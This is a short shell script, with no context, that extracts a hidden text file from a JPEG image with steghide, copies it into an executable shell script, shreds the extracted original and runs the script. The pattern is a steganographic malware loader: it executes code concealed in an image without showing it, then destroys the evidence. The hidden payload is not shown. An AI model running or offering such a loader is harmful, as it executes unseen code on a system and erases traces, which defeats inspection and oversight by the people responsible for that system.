steghide extract -sf guillotined_girl.jpg

ruby -e '
script = File.read("exec.txt").strip

open("exec.sh", "w") { |f|
  f.puts script
}
'

shred --remove exec.txt

chmod 744 exec.sh

./exec.sh
